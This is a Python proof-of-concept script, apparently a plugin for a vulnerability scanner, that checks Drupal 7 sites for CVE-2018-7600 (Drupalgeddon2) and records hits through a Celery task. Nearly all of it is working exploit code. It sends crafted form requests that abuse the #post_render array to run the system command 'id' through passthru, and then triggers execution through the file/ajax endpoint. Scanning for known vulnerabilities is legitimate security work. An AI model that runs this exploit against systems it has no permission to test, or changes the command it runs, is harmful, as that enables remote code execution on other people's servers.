#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2018-7600 POC
参考链接：https://github.com/fyraiga/CVE-2018-7600-drupalgeddon2-scanner
"""
import requests
import sys
import re

sys.path.append("/home/vagrant/code/scanner/")

from celery_tasks.save_poc_scan_results import save_poc_scan_results


class Drupal7RemoteCodeExecute:
    """"""

    def __init__(self, url, task_id, poc_id):
        """"""
        if not url.startswith("https://") and not url.startswith("http://"):
            # 默认设置为http
            url = "http://" + url
        self.url = url
        self.task_id = task_id
        self.poc_id = poc_id

    def run(self):
        send_params = {'q': 'user/password', 'name[#post_render][]': 'passthru', 'name[#markup]': 'id',
                       'name[#type]': 'markup'}
        send_data = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
        try:
            r = requests.post(self.url, data=send_data, params=send_params, timeout=5)
            m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
            if m:
                found = m.group(1)
                send_params2 = {'q': 'file/ajax/name/#value/' + found}
                send_data2 = {'form_build_id': found}
                r = requests.post(self.url, data=send_data2, params=send_params2)
                r.encoding = 'ISO-8859-1'
                out = r.text.split("[{")[0].strip()
                if out:
                    save_poc_scan_results(task_id=self.task_id, poc_id=self.poc_id)
        except:
            print("failed")


if __name__ == "__main__":
    ip = sys.argv[1]
    task_id = sys.argv[2]
    poc_id = sys.argv[3]
    testVuln = Drupal7RemoteCodeExecute(ip, task_id, poc_id)
    testVuln.run()
